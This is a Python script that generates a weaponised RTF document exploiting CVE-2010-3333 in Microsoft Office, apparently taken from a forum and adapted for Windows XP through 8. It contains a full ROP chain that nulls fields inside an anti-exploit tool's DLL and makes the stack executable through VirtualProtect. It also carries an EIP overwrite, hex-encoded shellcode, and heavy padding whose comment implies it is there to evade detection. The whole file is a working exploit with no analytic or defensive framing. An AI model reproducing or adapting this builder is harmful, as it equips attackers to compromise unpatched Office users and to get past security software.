import binascii
import sys
filename = "finalOutput.DOC"
import struct

# CVE-2010-3333, builder picked from some random forum.
# modified to work on windows xp-8, office 2007 (enforced DEP)
# rop chain first moves NULL into 2 offsets of mbae internal structs, then changes stack to RWX using mona.py
# working as of April 6, 2015

file="{\\rtF#\ansi\aNsIcpg1252\dEFf0\defLANG1033{\fONttbl{\f1\fswiss\FPRQ2\fcHArsET0 Berlin Sans FB Demi;}{\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a}{\f2\fnil\fcharset2 Symbol;}{\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a}}{/*/*/*}"
file+="\x0d\x0a"*2400000 #inc for UD -_-
file+="{\colortbl ;\red73\green255\blue73;}"
file+="{\*\generator Msftedit 5.41.15.1507;}\viewkind4\uc1\pard{\pntext\f2\'B7\tab}{\*\pn\pnlvlblt\pnf2\pnindent0{\pntxtb\'B7}}\fi-720\li720\qc\cf1\ul\b\i\f0\fs20 5/28/2011\cf0\ulnone\b0\i0\par"
file+="\cf1\ul\b\i\f1\fs40{\pntext\f2\'B7\tab}...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd...........................$iasdkasd...............Aeriaisdosd\cf0\ulnone\b0\i0\f0\fs20\par{\shp{\sp{\sn9pFRagMEnTS}{\*\*\*}{{{\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a}{{{{{\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a}}}{\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a}}}}{\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a}}{\*\*\sv {\*}9;2;a123456789.##########################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################################050000000000000000000000000000000000000000"

file+=b'd9808878'     #EIP
file+="9149414941444347FFFFFFFFFFFAFFFFBFFFFFFF"
magic_offset = 0x4cc90
rop_gadgets = [

0x78833e3c,  # POP EAX # RETN 
0x78801108,  # GetModuleHandle Address
0x78830e9a,  # MOV EAX,[EAX] # RETN
0x788543e9,  # XCHG EAX,EDX # RETN
0x7882ab5d,  # PUSH ESP # POP ESI # RETN
0x788e4a48,  # XCHG EAX,ESI # RETN
0x788079f0,  # POP EBP # RETN
0x00000098,  # offset from esp pointing towards mbae.dll
0x788d0ba7,  # ADD EAX,EBP # RETN # eax points to mbae.dll
0x7889363e,  # POP ECX # RETN
0x7889363f,  # RETN 
0x788fad49,  # POP EDI # RETN
0x7889363f,  # RETN
0x7880126c,  # POP ESI # RETN
0x7888e209,  # ADD ESP,0xC
0x788172ee,  # PUSHAD # RETN   #EAX gets base address of mbae.dll

0x788079f0,  # POP EBP # RETN
magic_offset,
0x788d0ba7,  # ADD EAX,EBP # RETN # eax points to magic offset
0x7880A254,  # POP EDX, RETN
0x00000000,  # NULL
0x78907a82,  # MOV [EAX],EDX # RETN
0x7887b821,  # ADD EAX,4 # RETN
0x78830e9a,  # MOV EAX,[EAX] # RETN
0x78907a82,  # MOV [EAX],EDX # RETN


0x78833e3c,  # POP EAX # RETN
0x788011c0,  # ptr to VirtualProtect()
0x788b53d1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN
0x788e4a48,  # XCHG EAX,ESI # RETN
0x78832a79,  # POP EBX # RETN
0x00000201,  # 0x00000201-> ebx
0x7880a254,  # POP EDX # RETN
0x00000040,  # 0x00000040-> edx
0x78854775,  # POP EBP # RETN
0x788b7b2b,  # jmp esp
0x7889363e,  # POP ECX # RETN
0x78922ad5,  # &Writable location msxml5.dll
0x788fad49,  # POP EDI # RETN
0x788880d4,  # RETN (ROP NOP)
0x78833e3c,  # POP EAX # RETN
0x90909090,  # nop
0x788172ee,  # PUSHAD # RETN
]
rop=''.join(struct.pack('<I', _) for _ in rop_gadgets)
rop= binascii.hexlify(rop)
payload=rop
payload+= b'9090eb09' # eb 09 to jump over mbae.dll's ascii  
payload+= b'6d6261652e646c6c00909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090'
shellcode= b'fce8890000006089e531d2648b52308b520c8b52148b72280fb74a2631ff31c0ac3c617c022c20c1cf0d01c7e2f052578b52108b423c01d08b407885c0744a01d0508b48188b582001d3e33c498b348b01d631ff31c0acc1cf0d01c738e075f4037df83b7d2475e2588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12eb865d6a018d85b90000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c6300'
payload+=shellcode

nxt="{}}}}}{}{}{{{{{}}}}}}"
nxt+="\x0d\x0a"
nxt+="}"
nxt+="\x0d\x0a\x00"
buff="If Peter Piper picked a pack of pickled peppers, how many pickled peppers did Peter Piper pick??????"*100


textfile = open(filename , 'w')
textfile.write(file+payload+nxt+buff)
textfile.close()
